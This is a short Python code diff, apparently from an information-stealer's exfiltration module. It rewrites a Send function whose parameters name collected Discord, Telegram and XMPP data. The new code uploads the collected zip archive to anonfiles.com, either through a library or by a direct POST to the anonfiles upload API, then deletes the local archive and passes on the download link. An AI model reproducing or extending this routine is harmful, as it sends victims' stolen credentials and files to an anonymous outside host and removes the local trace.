@@ -19,16 +19,26 @@ import os
 def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData):
 
 	try:
-		file = AnonFile()
-		try: 
-			upload = file.upload(rf'{np[0]}.zip', progressbar=True)
+		try:
+			file = AnonFile()
+			uploadedFile = file.upload(rf'{np[0]}.zip')
+			url = uploadedFile.url.geturl()
 		except:
-			pass
+			num = np[0].rfind("\\")
+			name = np[0][num+1:]
+			arr = open(rf'{np[0]}.zip', 'rb')
+			files = {
+    			'file': (f'{name}.zip', arr),
+			}
+			url = 'https://api.anonfiles.com/upload'
+			response = requests.post(url, files=files)
+			data = response.json()
+			url = data['data']['file']['url']['short']
+			arr.close()
 		try:
 			os.remove(f'{np[0]}.zip')
 		except:
 			pass
-		url = upload.url.geturl()
 		print(url)
 		try:
 			if type == 0:
